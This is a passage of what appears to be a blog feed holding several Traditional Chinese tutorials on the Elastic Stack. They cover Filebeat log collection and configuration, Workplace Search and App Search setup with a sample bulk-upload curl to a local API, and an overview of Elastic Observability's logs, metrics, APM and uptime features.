        <content type="html"><![CDATA[<p>這篇文章將更深入的去介紹 Log 與 Filebeat 在實際運用上的細節、基礎概念及相關配置教學，本篇文章將著重在 Filebeat 在收集 Log 上的運用。</p><ul><li>實體的 Log 檔提供了許多大祕寶讓我們去尋找人生的問題</li><li>一筆 Log 由 timestamp 還有相關訊息組成</li><li>透過 Filebeat 可以監控某個資料夾或是某個檔案</li><li>Filebeat 模組簡化了蒐集、解析、協助處理 Log 的格式與視覺化的難題</li></ul><h2 id="Log-的重要性"><a href="#Log-的重要性" class="headerlink" title="Log 的重要性"></a>Log 的重要性</h2><p>Log 就像是我們的好隊友，首先當然要了解隊友!!! 接下來才能夠跟隊友互相扶持共同成長，首先我們要</p><ul><li>了解隊友能協助我們解決了哪些屬性的難題</li><li>能夠提供怎麼樣的解決方案</li><li>透過什麼方式去解決和優化</li></ul><p>Log 解決了商業面的問題</p><ul><li>每天有多少使用者來用教學網站?</li><li>Node.js 的服務慢在哪裡?</li><li>上次實體活動有多少人註冊並登入?</li><li>什麼時候停機升級系統比較適合?</li></ul><h2 id="Log-的收集與解析"><a href="#Log-的收集與解析" class="headerlink" title="Log 的收集與解析"></a>Log 的收集與解析</h2><p>Elastic Stack 能夠處理不同的系統與服務的 Log，提供了兩種收集 Log 的工具</p><ul><li>filebeat: client 端處理實體 Log 檔</li><li>logstash: server 端才進行資料的處理</li></ul><p>解析 Log 常見問題</p><ul><li>一致性<ul><li>每個程式的格式都不同，透過不同模組定義 Pattern，解析成一致的格式</li></ul></li><li>時間格式<ul><li>ISO 8601 可到毫秒 (2018-10-05T14:30:00Z)</li></ul></li><li>分散在不同地方: Server 很多台查詢困難<ul><li>Elastic Search 方便檢索</li></ul></li><li>需要負責人可能才知道位置在哪 (SSH)<ul><li>Kibana、App Search 降低門檻</li></ul></li></ul><p>Log 在 Elastic Stack 中的生命週期</p><ul><li>資料的產生</li><li>Filebeat 傳送</li><li>處理與儲存<ul><li>Hot data: 常讀寫</li><li>Warm data: read-only 少用</li></ul></li><li>搜尋與分析</li><li>封存資料成 Warm data</li><li>Purge 清除不在使用的資料</li></ul><h2 id="Multi-Line-Processing"><a href="#Multi-Line-Processing" class="headerlink" title="Multi-Line Processing"></a>Multi-Line Processing</h2><p>Log 中每筆 event 可能會有包含多行的情境，Filebeat 也有提供相關配置，透過 regular expression patterns 來找出每筆 Log 開始的地方，搭配 negate 和 match 去找出整段，這裡有<a href="https://play.golang.org/p/uAd5XHxscu">線上解析器</a>來檢查我們寫的表達式。</p><ul><li>multiline.pattern: 找出每筆 Log 開始的地方</li><li>negate: true&#x2F;false</li><li>match: before&#x2F;after</li><li>multiline.flush_pattern: 標示結束</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">multiline.pattern: &#x27;test&#x27;</span><br><span class="line">negate: true</span><br><span class="line">match: before</span><br><span class="line">multiline.flush_pattern: &#x27;test end&#x27;</span><br><span class="line"></span><br><span class="line">[2020] test start</span><br><span class="line">oxox</span><br><span class="line">xoxo</span><br><span class="line">oxox</span><br><span class="line">[2020] test end</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Filebeat-深入理解"><a href="#Filebeat-深入理解" class="headerlink" title="Filebeat 深入理解"></a>Filebeat 深入理解</h2><p>Filebeat 提供很多預設的模組，讓實體 Log 檔無痛存到 Elasticsearch，預設的模組也提供了預設的 dashboards 非常方便，如何使用 Filebeat:</p><ul><li><a href="https://www.elastic.co/downloads/beats/filebeat">下載 Filebeat</a> 到需要監控 log 的主機</li><li>配置並啟動 Filebeat</li><li>用 kibana 介面看資料是否進入 Elasticsearch</li></ul><p>Filebeat 在安裝後 module 大部分預設都是 disabled 的，需要自行啟用</p><ul><li><code>./filebeat modules list</code> 可以看目前 module 的狀態</li><li><code>./filebeat modules enable nginx</code> 透過指令開啟模組，這裡是開啟 nginx</li></ul><p>配置 Filebeat 需要修改 filebeat.yml</p><ul><li>You can edit the yaml file to define different paths to logs</li><li>input 要抓哪些 log<ul><li>ignore_older: <code>ignore_older: 24h</code> 預設是 0 代表 disable</li><li>include_lines: <code>include_lines: [&#39;^WARN&#39;]</code></li><li>exclude_lines: <code>include_lines: [&#39;^INFO&#39;]</code></li><li>exclude_files: <code>exclude_files: [&#39;\.gz$&#39;]</code></li></ul></li><li>output 則是要要放到哪台 Elasticsearch</li><li>也可以在配置中啟用模組</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">filebeat.modules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">module:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">module:</span> <span class="string">mysql</span></span><br></pre></td></tr></table></figure><p>接著在開始配置前，先透過指令測試我們的配置檔</p><p><code>./filebeat test config</code><br><code>./filebeat test output</code><br><code>./filebeat test -c custom.yml output</code></p><p>執行以下指令配置 Filebeat，目的是確認 Elasticsearch 跟 kibana 是否可以連線，只需要跑一次即可</p><p><code>./filebeat setup</code></p><p>不幸需要 debug 的話<br><code>./filebeat -e -d &quot;publish&quot;</code></p><h2 id="Filebeat-Resilience-and-Recovery"><a href="#Filebeat-Resilience-and-Recovery" class="headerlink" title="Filebeat Resilience and Recovery"></a>Filebeat Resilience and Recovery</h2><p>Filebeat 會自動幫我們確認新檔案，並且在傳送資料時會使用偵測背壓 (backpressure) 的協定，當 Logstash 或是 Elasticsearch 告知壓力過大，Filebeat 會自動減速，也有相關配置可以依照系統效能和需求去設定:</p><ul><li>scan_frequency: 預設掃描新檔案頻率是十秒一次，最低建議不要低於一秒</li><li>back_off: 預設是一秒後再掃一次，如果 Filebeat 過於忙碌就會減少頻率<ul><li>達到 EOF 時 back_off 就照 backoff_factor 的值 (預設 2 倍) 去增加 back_off 時間</li><li>直到達到 max_backoff 就是長的等待秒數</li><li>只要有偵測到文件有新的變化就會重置</li></ul></li></ul><p>Filebeat 所有的資訊都透過 registry 來儲存現在的狀態，如果當機也會從這裡儲存的狀態恢復，存放的位置會在:</p><ul><li><code>var/lib/filebeat/registry</code></li><li><code>C:\ProgramData\filebeat\registry</code></li></ul><p>如果發現 registry 檔案太大可以透過以下配置來改善:</p><p><code>clean_inactive</code><br><code>clean_removed</code></p><h2 id="Log-X-Elasticsearch"><a href="#Log-X-Elasticsearch" class="headerlink" title="Log X Elasticsearch"></a>Log X Elasticsearch</h2><p>Elasticsearch 都是用 Index 來儲存的，Filebeat 預設是使用 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/index-lifecycle-management.html">ILM</a> (Index Lifecycle Management)，ILM 的概念如下</p><ul><li>‒{type}beat-{agent.version}-{yyyy-MM-dd}-000001</li><li>當硬碟空間或資料數量達到設定上限時，用新的取代最舊的</li><li>可以用天、周、月當單位來創建 Index 並封存前一個</li><li>方便刪掉過舊的資料</li></ul><p>確認資料是不是有進到 Elasticsearch:</p><ul><li>用 Dev Tool Console 透過 REST API 去看進入 Elasticsearch 的原始資料<ul><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-wildcard-query.html">Wildcards</a> 搜尋</li></ul></li><li>透過 Kibana 分析資料，需定義 index pattern 讓 kibana 能夠視覺化 (ILM)<ul><li>filebeat-*</li></ul></li></ul><p>透過 Kibana 查看 dashboards</p><ul><li>確認 Elasticsearch 及 Kibana 正在運行</li><li>Filebeat 配置確認:<ul><li>Elasticsearch 位置有設定在 output</li><li>確認 Kibana URL</li></ul></li><li>執行指令 <code>./filebeat setup --dashboards</code></li><li>內建模組 Kibana 可以直接查看內建的 dashboards</li></ul><p>Log 如果搭配 Metrics、APM 會更容易評估系統和服務，但很可能因此資料量過大，這時 Elasticsearch 可以無痛的按照用途分成不同的 cluster，像是分成監控專用、APM 專用來達到分散流量的效果。</p>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Workplace Search Quick Start</title>
      <link href="/2020/09/08/elastic-workplace-search-quick-start/"/>
      <url>/2020/09/08/elastic-workplace-search-quick-start/</url>
      
        <content type="html"><![CDATA[<p>這篇文章會示範如何使用 Elastic Workplace Search (工作區檢索)，工作區檢索讓我們能夠匯入並整合第三方服務的資料到搜尋引擎中，像是 Google Drive、Dropbox 等等，使用 Elastic Cloud 服務可以在幾分鐘內完成所有相關設定與資料匯入。</p><h2 id="Workplace-Search-簡介"><a href="#Workplace-Search-簡介" class="headerlink" title="Workplace Search 簡介"></a>Workplace Search 簡介</h2><p>為什麼需要工作區 (Workplace) 檢索</p><ul><li>整合的搜尋介面: 檔案散落在各大服務中，不一定會記得哪份文件放在哪裡<ul><li>跨部門檔案共享，檔案不一定是你建立的，相關文件往往很難找?</li></ul></li><li>優秀的分類篩選檢索，能更快找到某檔名的 pdf 的檔案</li></ul><p>解決的痛點:</p><ul><li>開箱即用</li><li>搜尋效能棒</li><li>找文件不再大海撈針</li><li>提供 Custom API Source 匯入相關內容</li><li>可依群組調整權限與結果<ul><li>提供不同群組的結果權重調整</li></ul></li></ul><h2 id="Workplace-Search"><a href="#Workplace-Search" class="headerlink" title="Workplace Search"></a>Workplace Search</h2><p>使用方式:</p><ul><li>新增資料源，這次使用 <a href="https://www.elastic.co/guide/en/workplace-search/7.9/workplace-search-dropbox-connector.html">Dropbox</a>，按照相關文件設定即可，其他資訊源大多也都類似以下步驟<ul><li>建立一個 OAuth 2 APP <a href="https://www.dropbox.com/developers/apps">https://www.dropbox.com/developers/apps</a></li><li>先選 Lagency 的 API 並照著輸入相關資料</li><li>回到 Workplace Search 按 connect</li></ul></li><li>設定完成後就可以到 Search Application 中試用 (左側選單中最下面的放大鏡)</li></ul><blockquote><p>Connect 後可以看到檢索的內容 Summary<br><img src="/2020/09/08/elastic-workplace-search-quick-start/SourceOverview.JPG" alt="SourceOverview"></p></blockquote><blockquote><p>Search Application 介面<br><img src="/2020/09/08/elastic-workplace-search-quick-start/WorkplaceSearchDropbox.JPG" alt="WorkplaceSearchDropbox"></p></blockquote><h2 id="Custom-API-Source"><a href="#Custom-API-Source" class="headerlink" title="Custom API Source"></a>Custom API Source</h2><p>這部分比較特別，因為不是第三方所以不需要經過 OAuth，建立 Custom API Source 會得到 key 跟 token，接著就可以透過打 API 的方式新增資料。</p><blockquote><p>建立 Custom API Source 介面<br><img src="/2020/09/08/elastic-workplace-search-quick-start/CustomAPISource.JPG" alt="CustomAPISource"></p></blockquote><p>Curl 的範例如下，我們只需要把 URL 換成 Elastic Cloud，將 <code>[KEY]</code> 及 <code>[AUTH_TOKEN]</code> 換成我們剛剛得到的值，就可以將資料匯入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:3002/api/ws/v1/sources/[KEY]/documents/bulk_create \</span><br><span class="line">-H &quot;Authorization: Bearer [AUTH_TOKEN]&quot; \</span><br><span class="line">-H &quot;Content-Type: application/json&quot; \</span><br><span class="line">-d &#x27;[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;_allow_permissions&quot;: [&quot;permission1&quot;],</span><br><span class="line">    &quot;_deny_permissions&quot;: [],</span><br><span class="line">    &quot;id&quot; : 1234,</span><br><span class="line">    &quot;title&quot; : &quot;The Meaning of Time&quot;,</span><br><span class="line">    &quot;body&quot; : &quot;Not much. It is a made up thing.&quot;,</span><br><span class="line">    &quot;url&quot; : &quot;https://example.com/meaning/of/time&quot;,</span><br><span class="line">    &quot;created_at&quot;: &quot;2019-06-01T12:00:00+00:00&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;list&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;_allow_permissions&quot;: [],</span><br><span class="line">    &quot;_deny_permissions&quot;: [&quot;permission2&quot;],</span><br><span class="line">    &quot;id&quot; : 1235,</span><br><span class="line">    &quot;title&quot; : &quot;The Meaning of Sleep&quot;,</span><br><span class="line">    &quot;body&quot; : &quot;Rest, recharge, and connect to the Ether.&quot;,</span><br><span class="line">    &quot;url&quot; : &quot;https://example.com/meaning/of/sleep&quot;,</span><br><span class="line">    &quot;created_at&quot;: &quot;2019-06-01T12:00:00+00:00&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;list&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;_allow_permissions&quot;: [&quot;permission1&quot;],</span><br><span class="line">    &quot;_deny_permissions&quot;: [&quot;permission2&quot;],</span><br><span class="line">    &quot;id&quot; : 1236,</span><br><span class="line">    &quot;title&quot; : &quot;The Meaning of Life&quot;,</span><br><span class="line">    &quot;body&quot; : &quot;Be excellent to each other.&quot;,</span><br><span class="line">    &quot;url&quot; : &quot;https://example.com/meaning/of/life&quot;,</span><br><span class="line">    &quot;created_at&quot;: &quot;2019-06-01T12:00:00+00:00&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;list&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>當然也可以寫程式或透過 GUI 像是 RestEasy 打資料進去<br><img src="/2020/09/08/elastic-workplace-search-quick-start/AddDataToCustomAPI.JPG" alt="AddDataToCustomAPI"></p></blockquote><h2 id="Workplace-Search-設定"><a href="#Workplace-Search-設定" class="headerlink" title="Workplace Search 設定"></a>Workplace Search 設定</h2><p>設定資料來源後 Workplace Search 也提供了好幾種的設定，可以調整的部分如下:</p><ul><li>Group: 可以建立資料分類群組<ul><li>SourcePrioritization: 針對群組檢索的結果進行權重配置</li></ul></li><li>Role Mappings: 角色的分配</li></ul><p>Group，舉例來說可以分成工程師、PM、行銷三種群組</p><blockquote><p>資料群組分類<br><img src="/2020/09/08/elastic-workplace-search-quick-start/ManageGroup.JPG" alt="ManageGroup"></p></blockquote><p>SourcePrioritization，每個人想要看到的內容可能優先權不太一樣。</p><ul><li>工程師 &#x3D;&gt; 規格書優先 (Dropbox + Github)</li><li>PM、行銷 &#x3D;&gt; 企畫書優先 (Google Drive)</li></ul><blockquote><p>檢索的結果進行權重配置<br><img src="/2020/09/08/elastic-workplace-search-quick-start/SourcePrioritization.JPG" alt="SourcePrioritization"></p></blockquote><p>Role Mappings: 分完群組後就可以進行角色配置，將角色對應到剛剛的群組</p><blockquote><p>角色配置<br><img src="/2020/09/08/elastic-workplace-search-quick-start/RoleMappings.JPG" alt="RoleMappings"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic App Search Quick Start</title>
      <link href="/2020/09/06/elastic-app-search-quick-start/"/>
      <url>/2020/09/06/elastic-app-search-quick-start/</url>
      
        <content type="html"><![CDATA[<p>這篇文章會示範如何使用 Elastic App Search，App Search 是一個全文檢索的引擎，使用 Elastic Cloud 服務可以在幾分鐘內完成搜尋引擎的所有相關設定與資料匯入。下一篇文章則會介紹能夠整合各式工作區的另外一個服務 <a href="https://linyencheng.github.io/2020/09/08/elastic-workplace-search-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Workplace Search</a>，兩種服務都是能夠在幾分鐘內完成快速架設，真的非常方便。</p><h2 id="App-Search-簡介"><a href="#App-Search-簡介" class="headerlink" title="App Search 簡介"></a>App Search 簡介</h2><p>為什麼需要全文檢索引擎</p><ul><li>什麼資料如果都直接對 DB 操作，資料量到某個程度時絕對不堪負荷</li><li>比起結構化的資料庫能提供更好的大海撈針能力</li><li>結果的同義詞搜尋與索引權重調整等功能</li></ul><p>解決的痛點:</p><ul><li>前後端原則上開箱即用，微調即可</li><li>大海撈針的效能棒</li><li>容易客製化搜尋結果，每筆搜尋結果都依分數排序，分數算法可以調整</li><li>加機台更容易</li></ul><p>每個 App Search 都是一個獨立的引擎負責:</p><ul><li>搜尋 Elasticsearch 中的資料</li><li>提供 API 整合調整資料來源到 Elasticsearch</li><li>提供 API 與程式或使用者介面互動</li></ul><p>使用方式:</p><ul><li><p>上傳資料，這次使用的是<a href="https://github.com/LinYenCheng/coffee-map/tree/master/public/cafedata">開源的咖啡廳資料</a></p></li><li><p>前後端都開箱即用，前端在設定好後還有 react 版本的範例程式提供下載</p><blockquote><p>先進行欄位相關的設定: 要搜尋的標題、需要篩選和排序的欄位<br><img src="/2020/09/06/elastic-app-search-quick-start/ReferenceUI.JPG" alt="ReferenceUI"></p></blockquote><blockquote><p>UI 範例程式 Demo 與下載<br><img src="/2020/09/06/elastic-app-search-quick-start/SampleUI.JPG" alt="SampleUI"></p></blockquote></li></ul><h3 id="App-Search-優化"><a href="#App-Search-優化" class="headerlink" title="App Search 優化"></a>App Search 優化</h3><p>資料上傳後 App Search 也提供了好幾種的優化方式，可以調整的部分如下</p><ul><li>Schema (調整欄位的性質)</li><li>Synpnyms (同義詞搜尋)</li><li>Curation (字詞糾正)</li><li>Relevance(欄位權重調整)</li></ul><blockquote><p>Schema (調整欄位的性質): 預設都是 text，需要把數字跟位置設成對應格式<br><img src="/2020/09/06/elastic-app-search-quick-start/Schema.JPG" alt="Schema"></p></blockquote><blockquote><p>Synpnyms (同義詞搜尋): 當搜尋的關鍵字沒有結果時，可以給那個關鍵字一個接近的字詞<br>譬如一夜乾找不到的話，一夜乾就可以搭配虱目魚同義詞，之後就可以得到虱目魚的相關結果<br><img src="/2020/09/06/elastic-app-search-quick-start/Synonyms.JPG" alt="Synonyms"></p></blockquote><blockquote><p>Curation (字詞糾正): 有些結果不想顯示、或是想要讓某些結果顯示在前面<br><img src="/2020/09/06/elastic-app-search-quick-start/Curation.JPG" alt="Curation"></p></blockquote><blockquote><p>Relevance(欄位權重調整): 標題跟敘述，會希望標題吻合的分數更高<br><img src="/2020/09/06/elastic-app-search-quick-start/Relevance.JPG" alt="Relevance"></p></blockquote><h2 id="索引觀念解析"><a href="#索引觀念解析" class="headerlink" title="索引觀念解析"></a>索引觀念解析</h2><p>以前高中讀的單字書，印象中只有分級沒有經過排序，但可能有單字間的相關性？是為了方便記憶及背誦？字典就比較不一樣，字典會有個按照發音或是筆劃所建立目錄或索引，而透過排序過的索引，能夠進一步增加我們查閱的速度。</p><p>生活上來說就像平常我的衣服是亂糟糟整坨放床上的，但透過這種概念，我會把它分成短袖長袖短褲長褲… 這樣每次要跑步找短褲會比較快，直接到短褲區找就好了，當然破萬筆的索引沒那麼簡單 xddd</p><h3 id="反向索引"><a href="#反向索引" class="headerlink" title="反向索引"></a>反向索引</h3><p><a href="https://www.ithome.com.tw/voice/90361">全文檢索引擎</a>用的是反向索引，最簡單的做法是先把句子切分詞，<code>&quot;他&quot; &quot;原理&quot; &quot;像&quot; &quot;是&quot; &quot;這樣&quot; &quot;會&quot; &quot;切字&quot;</code> 然後透過分詞統計值運算後找那些分詞最有可能在的位置。底下的例子我們如果搜尋 <code>bright butterfly</code> 就是 <code>&#123;1,3&#125; ∩ &#123;1&#125;</code> 得到 <code>1</code> 所以我們可以得到 <code>Document 1</code> 的結果。</p><iframe src="//www.slideshare.net/slideshow/embed_code/key/zCzprmwnG6clxJ?startSlide=10" width="595" height="485" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/richu100/elasticsearch-vs-relational-database" title="Elasticsearch V/s Relational Database" target="_blank">Elasticsearch V/s Relational Database</a> </strong> from <strong><a href="//www.slideshare.net/richu100" target="_blank">Richa Budhraja</a></strong> </div><h3 id="Solr、Lunr"><a href="#Solr、Lunr" class="headerlink" title="Solr、Lunr"></a>Solr、Lunr</h3><p>最後重點，推薦!!! 除了雲端的 Elastic App Search 外，Solr 也很好用，實作上也相當的簡單，關鍵就是要<a href="https://lucene.apache.org/solr/guide/6_6/using-solrj.html">餵原始資料</a>然後告訴 Solr 要將哪些欄位<a href="https://examples.javacodegeeks.com/enterprise-java/apache-solr/solr-schema-xml-example/">建立索引</a>，未來就可以直接透過索引來找資料了，厲害的 Solr 也有提供<a href="https://lucene.apache.org/solr/guide/6_6/spatial-search.html">空間資料的檢索</a>，透過定義經緯度 ( lat, lng )，就可以簡單的做出搜尋我附近的美食這種功能。</p><p>如果需要在前端使用全文檢索，Lunr 提供了一個輕量化的函式庫，當然分詞的部分是以英文為主，網路上就有人提供了一個中文的分詞，開源的時代真的是很需要大家互相協助，希望有一天自己也可以。</p><p><a href="https://github.com/Wiredcraft/lunr-chinese">https://github.com/Wiredcraft/lunr-chinese</a></p><p>而我也在自己實作的<a href="https://linyencheng.github.io/coffee-map">咖啡地圖中</a>就採用了這個檢索，原因我並沒有實作後端，後端是串接開源的資料，每次縣市回來就是 500 筆以上，使用這樣的檢索引擎可以更快速的幫我找到要找到的資料。</p><p>開源的資料：<a href="https://cafenomad.tw/developers/docs/v1.2">https://cafenomad.tw/developers/docs/v1.2</a></p>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Observability 簡介</title>
      <link href="/2020/09/05/elastic-observability-fundamentals-introduction/"/>
      <url>/2020/09/05/elastic-observability-fundamentals-introduction/</url>
      
        <content type="html"><![CDATA[<p>繼前面幾篇文章教大家怎麼安裝 <a href="/2020/09/02/elastic-logging-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Filebeat (Logs)</a>、<a href="/2020/09/03/elastic-metrics-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Metricbeat (Metrics)</a>、<a href="/2020/09/04/elastic-apm-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">APM (Apm)</a> 後，這篇文章將淺談 Observability 及用四大功能 Logs、Metrics、Apm、Uptime 將可用資訊彙整與視覺化。</p><p>方便的 Observability 工具讓我們可以更容易地監控機器與服務，進一步也可以透過 Elastic Cloud 提供的機器學習視覺化工具去分析了解我們的指標或資料。</p><h2 id="Elastic-Observability-簡介"><a href="#Elastic-Observability-簡介" class="headerlink" title="Elastic Observability 簡介"></a>Elastic Observability 簡介</h2><p>目標是可以偵測並快速找到服務的停機時間、錯誤、回應過慢的可能原因，讓系統達到:</p><ul><li>可用性 (usability)</li><li>高可用性 (high availability)</li><li>穩定性 (stability)</li></ul><p>Observability 可以看成是其中一種搜尋案例，主要</p><ul><li>Logs: 集中管理各種實體 Log 資料</li><li>Metrics: 監控並了解 infrastructure、apps、services 相關指標趨勢，更進一步也可提供告警機制</li><li>Apm: 著重在哪些服務被使用，讓效能瓶頸更容易被找到</li><li>Uptime: 主要協助監控主機是否活著</li></ul><p>Observability 的目的是幫助我們快速找到問題，幾個名詞定義</p><ul><li>SLI (Service Level Indicators): Uptime</li><li>SLO (Service Level Objectives): 95%</li><li>SLA (Service Level Agreement): Uptime 95%</li></ul><p>舉例來說最後我們的目標就會是希望某個系統的 Uptime 維持在 95%，並在低於 95% 的時候有相關紀錄甚至是提供告警的機制。</p><h3 id="Elastic-Common-Schema-ECS"><a href="#Elastic-Common-Schema-ECS" class="headerlink" title="Elastic Common Schema (ECS)"></a>Elastic Common Schema (ECS)</h3><p>在我們照著相關範例啟動並查看 Dashborad 時，會發現 <a href="https://www.elastic.co/guide/en/ecs/current/ecs-reference.html">Elastic Common Schema (ECS)</a> 這個名詞，ESC 是一種新規格，讓使用者以一致、可定義的方式整理 Elasticsearch 中資料結構，協助分析不同來源的數據。</p><p>透過 ECS，使用者可以更方便的去使用儀錶板或是 Machine Learning 等工具分析内容，更方便的去建立並搜尋。</p><h2 id="如何使用-Elastic-監控系統"><a href="#如何使用-Elastic-監控系統" class="headerlink" title="如何使用 Elastic 監控系統"></a>如何使用 Elastic 監控系統</h2><p>如果是 DevOops 或是系統維運的團隊，會需要監控機台的相關資訊，前面幾篇文章有介紹怎麼安裝使用 Elastic Cloud 提供的 <a href="/2020/09/02/elastic-logging-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Filebeat (Logs)</a>、<a href="/2020/09/03/elastic-metrics-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Metricbeat (Metrics)</a>、<a href="/2020/09/04/elastic-apm-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">APM (Apm)</a> 去進行資料蒐集與系統和服務監控。</p><ul><li><a href="/2020/09/02/elastic-logging-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Filebeat (Logs)</a><ul><li>Web Sever log</li><li>App log</li><li>DB log</li><li>Container log</li></ul></li><li><a href="/2020/09/03/elastic-metrics-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Metricbeat (Metrics)</a><ul><li>Container Metric</li><li>Host Metric</li><li>DB Metric</li><li>網路流量</li><li>硬碟空間</li></ul></li><li><a href="/2020/09/04/elastic-apm-quick-start/?utm_source=link&utm_medium=article&utm_campaign=internal_link">APM (Apm)</a><ul><li>服務使用情況</li><li>交易狀況</li><li>服務依賴狀況</li></ul></li><li>Heartbeat (Uptime)<ul><li>Uptime</li><li>回應速度</li></ul></li></ul><p>舉例來說如果今天我們使用 Nginx 當成我們的附載平衡伺服器時，我們可以安裝:</p><ul><li>Metricbeat: 監控相關連線數及 CPU 狀況<ul><li>connections</li><li>CPU</li></ul></li><li>Filebeat: 蒐集相關 Log<ul><li>access log</li><li>error log</li></ul></li><li>Kibana: 要注意 Index Pattern 需要讓 kibana 可以辨識 (ECS)</li></ul><h3 id="Beats"><a href="#Beats" class="headerlink" title="Beats"></a>Beats</h3><p>不管是 Logs、Metrics、APM 都是透過 Beats 傳送到 Elasticsearch，Beats 是開源的 data shippers，可以安裝到程式中做為 agents 提供相關的資料到 Elasticsearch，Elastic 提供了各式各樣的用途 Beats 給使用者:</p><ul><li>Filebeat: 傳送實體檔案型的 log</li><li>Metricbeat: 系統或服務的狀態監控</li><li>Packetbeat: 監控封包</li><li>Winlogbeat: 微軟相關事件</li><li>Auditbeat: Linux Audit data</li><li>Heatbeat: Uptime 監控</li><li>Functionalbeat: Serverless 相關監控</li></ul><p>使用 Beats 解決了什麼問題:</p><ul><li>讀取解析 log 檔</li><li>取得系統或服務相關指標</li><li>取得網路傳輸相關指標</li><li>測試服務可用性</li></ul><h3 id="Logs"><a href="#Logs" class="headerlink" title="Logs"></a>Logs</h3><p>解決的痛點</p><ul><li>每個應用程式或是裝置都有各自格式需要解析</li><li>時間格式不一定相同，需要整合</li><li>通常是需要專家才看得懂的格式</li></ul><p>Log 小結:</p><ul><li>提供了尋找問題解答的材料</li><li>一筆 log 由 timestamp 還有訊息組成</li><li>透過 Filebeat 可以監控資料夾或是某個檔案</li><li>Filebeat 模組簡化了蒐集、解析、協助處理 log 的格式</li><li>只要資料送到 Elasticsearch 就能夠被檢索</li></ul><h3 id="Metrics"><a href="#Metrics" class="headerlink" title="Metrics"></a>Metrics</h3><p>解決了什麼問題</p><ul><li>知道主機在每個時間的狀況</li></ul><p>Metrics 和 Logs 都是依照時序來記錄的資料，提供了系統相關的可觀察資料，主要差異如下</p><ul><li>Logs: 事件發生了才記住什麼時候發生及發生的事情 (相關格式大多不同)</li><li>Metrics: 定時的紀錄相關指標，像是硬碟空間、處理器使用量、Process 數量等等</li></ul><p>Metricbeat 可以從系統及服務上蒐集多個監控指標，原則上安裝好就可以用了:</p><ul><li>下載安裝 Metricbeat</li><li>設定 Metricbeat</li><li>開始 Metricbeat</li></ul><h3 id="APM"><a href="#APM" class="headerlink" title="APM"></a>APM</h3><p>解決了什麼問題</p><ul><li>每個 requests 回應時間，找出服務在哪裏花了最多時間</li><li>服務發生了什麼類型的錯誤，即使程式沒處理也會被蒐集</li></ul><p>一套完整的 APM 會由以下組成</p><ul><li>APM Agents: 是一個 lib 需要寫進去我們的程式裡</li><li>APM Server:<ul><li>beat framwork 實作的 http server</li><li>協助驗證並轉換格式寫入 Elasticsearch</li><li>資料灌爆來不及寫入的時候可以當 bufffer</li><li>與使用者之間多了一層 server 對資料來說也更安全</li><li>開 API 讓更多類型的 client 容易串接</li></ul></li><li>Elasticsearch</li><li>Kibana: 相當於 Elasticsearch 的後台 GUI</li></ul><p>APM 紀錄哪些東西</p><ul><li>spans: 哪行程式被執行多久</li><li>transactions: 也是一種 span</li><li>errors: 紀錄程式或是服務拋出的錯誤及未處理的錯誤，且包含 stack trace 方便 debug</li><li>metrics: Distributed Tracing 讓 microservices 